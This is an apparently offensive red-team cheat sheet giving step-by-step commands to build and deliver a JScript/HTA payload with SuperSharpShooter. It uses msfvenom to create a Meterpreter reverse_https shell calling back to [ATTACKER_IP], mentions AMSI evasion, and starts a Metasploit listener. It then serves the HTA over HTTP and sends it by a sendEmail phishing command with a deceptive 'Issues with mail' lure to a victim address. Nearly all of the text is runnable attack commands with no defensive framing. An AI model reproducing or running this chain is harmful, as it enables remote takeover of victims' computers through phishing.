# JScript from SuperSharpShooter

### 1) Download project 

    git clone https://github.com/ScriptIdiot/SuperSharpShooter

### 2) Craft payload

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o shell.txt

### 3) Run the tool to obtain the .js code, other options like AMSI evasion are available in the documentation of the GitHub repo

    ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.txt --payload js --output payload

### 4) Start listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"

### 5) Create an .hta file, and copy all the contents of the payload.js file into the below template

    <html>
    <head>
    <script language="JScript">
    // INSERT CODE HERE
    </script>
    </head>
    <body>
    
    <script language="JScript">
    self.close();
    </script>
    
    </body>
    </html>

### 6) Start HTTP Server

    python3 -m http.server 80

### 7) Deliver it to the user, remember that it has to be in the form of a link, so it could be a link or a shortcut like the one below: C:\Windows\System32\mshta.exe http://[ATTACKER_IP]/drop.hta, below is just an example for email

    sendEmail -s [SNMP_SERVER] -t [VICTIM_EMAIL_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -m "Please click here http://[ATTACKER_IP]/drop.hta" -a drop.hta

